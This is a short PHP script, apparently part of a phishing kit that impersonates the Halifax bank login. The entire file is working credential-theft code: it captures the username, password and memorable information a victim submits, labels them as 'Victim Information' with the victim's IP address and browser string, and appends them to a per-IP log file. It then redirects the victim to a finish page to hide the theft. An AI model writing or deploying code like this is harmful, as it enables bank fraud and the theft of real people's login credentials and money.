<?php


$date = date('l d F Y');
$time = date('H:i');
$username = $_POST['username'];
$password = $_POST['password'];
$memo = $_POST['memorable'];
$ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];

$data = "
+ =================HALIFAX=================+
+ ------------------------------------------+
+ Account Information (Halifax)
| Username : $username
| Password : $password
| Memorable : $memo
+ ------------------------------------------+
+ Victim Information
| Ip = $ip
| User Agent = $agent
| Received : $date @ $time
+ ------------------------------------------+
";


$handle = fopen("../../users/$ip.txt", "a");
fwrite($handle, $data);
header("Location: ../../Finish.php");
?>